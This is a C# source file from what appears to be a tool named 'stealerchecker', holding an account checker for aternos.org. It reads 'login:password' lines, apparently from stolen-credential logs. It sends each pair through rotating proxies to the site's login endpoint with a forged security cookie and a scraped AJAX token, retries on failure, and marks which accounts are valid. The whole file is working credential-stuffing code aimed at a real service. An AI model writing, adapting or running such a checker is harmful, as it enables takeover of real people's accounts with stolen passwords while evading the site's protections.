using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using Leaf.xNet;
using Newtonsoft.Json.Linq;
using ScrapySharp.Network;

namespace stealerchecker.Checkers;

public interface IChecker
{
    public string Service { get; }
    public void ProcessLine(string line, string proxy, ProxyType type, out string result, out bool isValid);
}

internal class Aternos : IChecker
{
    private static KeyValuePair<string, string> ajax;
    private static string TOKEN;

    private static readonly ScrapingBrowser browser = new()
    {
        UserAgent = FakeUserAgents.OperaGX,
        KeepAlive = true
    };

    private static readonly string html = browser.NavigateToPage(new Uri("https://aternos.org/go/")).Content;

    private static readonly Random random = new();

    public string Service => "aternos.org";

    public void ProcessLine(string line, string proxy, ProxyType type, out string result, out bool isValid)
    {
        var req = new HttpRequest
        {
            UserAgent =
                "Mozilla / 5.0(Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.164 Safari/537.36 OPR/77.0.4054.275 (Edition Yx GX)",
            UseCookies = true,
            Cookies = new CookieStorage()
        };
        req.Cookies.Add(new Cookie($"ATERNOS_SEC_{ajax.Key}", ajax.Value, "/", "aternos.org"));

        string login = line.Split(':')[0],
            pass = line.Split(':')[1].Replace("\r", "");
        again:

        req.Proxy = ProxyClient.Parse(type, proxy);
        try
        {
            var url =
                $"https://aternos.org/panel/ajax/account/login.php?SEC={ajax.Key + Uri.EscapeDataString(":") + ajax.Value}&TOKEN={TOKEN}";
            var post = $"user={login}&password={CreateMD5(pass)}";

            HttpResponse resp;

            try
            {
                resp = req.Post(url, post, "application/x-www-form-urlencoded");
            }
            catch (HttpException)
            {
                goto again;
            }

            var json = JObject.Parse(resp.ToString());
            var success = bool.Parse(json["success"].ToString());
            if (success)
            {
                isValid = true;
                result = "success";
            }
            else if (json["error"].ToString().Contains("Google"))
            {
                isValid = true;
                result = json["error"].ToString();
            }
            else
            {
                isValid = false;
                result = null;
            }
        }
        catch
        {
            Console.WriteLine("oops!");

            ajax = getAjaxToken();
            TOKEN = getTOKEN();

            goto again;
        }

        ajax = getAjaxToken();
        TOKEN = getTOKEN();
    }

    private static KeyValuePair<string, string> getAjaxToken()
    {
        return new KeyValuePair<string, string>(RandomString(11) + "00000", RandomString(11) + "00000");
    }

    private static string getTOKEN()
    {
        return Regex.Match(html, "const AJAX_TOKEN = \"([A-Za-z0-9]*)\";").Groups[1].Value;
    }

    public static string CreateMD5(string input)
    {
        using var md5 = MD5.Create();
        var inputBytes = Encoding.ASCII.GetBytes(input);
        var hashBytes = md5.ComputeHash(inputBytes);

        var sb = new StringBuilder();
        for (var i = 0; i < hashBytes.Length; i++)
            sb.Append(hashBytes[i].ToString("X2"));
        return sb.ToString();
    }

    public static string RandomString(int length)
    {
        const string chars = "abcdefghijklmnopqrstuvwxyz0123456789";
        return new string(Enumerable.Repeat(chars, length)
            .Select(s => s[random.Next(s.Length)]).ToArray());
    }
}